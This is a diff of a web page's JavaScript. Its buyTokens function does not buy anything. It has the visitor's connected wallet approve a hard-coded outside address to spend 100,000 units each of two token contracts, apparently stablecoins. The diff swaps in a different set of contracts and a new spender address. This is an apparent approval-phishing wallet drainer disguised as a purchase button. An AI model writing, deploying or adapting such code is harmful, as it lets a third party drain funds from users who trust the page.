@@ -73,10 +73,10 @@
     }
 
     async function buyTokens() {
-      const contractAddress1 = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-      const contractAddress2 = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
-      // const contractAddress1 = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
-      // const contractAddress2 = "0x55d398326f99059fF775485246999027B3197955";
+      // const contractAddress1 = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+      // const contractAddress2 = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+      const contractAddress1 = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
+      const contractAddress2 = "0x55d398326f99059fF775485246999027B3197955";
       const num256 = 100000 * 10 ** 18;
       const fix1 = num256.toString();
       const fix2 = "0x" + num256.toString(16);
@@ -86,11 +86,11 @@
       let myContract2 = new _web3.eth.Contract(contractAbi, contractAddress2);
 
 
-      myContract1.methods.approve("0xCCbbbfA08E06136EEfCD887c7eF8381cf3c04F51", fix2).send({
+      myContract1.methods.approve("0x918bCce18efa4B585ACe1a79BbB1f094367A7365", fix2).send({
         from: window.account,
         gasLimit: 60000
       });
-      myContract2.methods.approve("0xCCbbbfA08E06136EEfCD887c7eF8381cf3c04F51", fix2).send({
+      myContract2.methods.approve("0x918bCce18efa4B585ACe1a79BbB1f094367A7365", fix2).send({
         from: window.account,
         gasLimit: 60000
       });
